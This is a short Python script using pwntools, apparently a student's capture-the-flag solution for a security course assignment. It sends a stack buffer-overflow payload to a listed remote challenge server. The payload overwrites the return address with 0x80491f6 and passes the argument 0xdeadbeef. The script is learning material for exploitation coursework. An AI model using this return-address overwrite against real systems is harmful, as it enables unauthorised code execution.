'''
Creators:       Malachi Parks
Section:        CPEG476-010
Assignment:     Pacecar Problem 9
File Description:  Used to print to the nc session

165.22.46.243", 13337

Run in interactive python to key flag
'''

from pwn import *
rbytesV1=b'a'*28+p32(0x80491f6)+b'a'*4+p32(0xdeadbeef)
p=remote("165.22.46.243", 13337)
p.sendline(rbytesV1)
p.recv()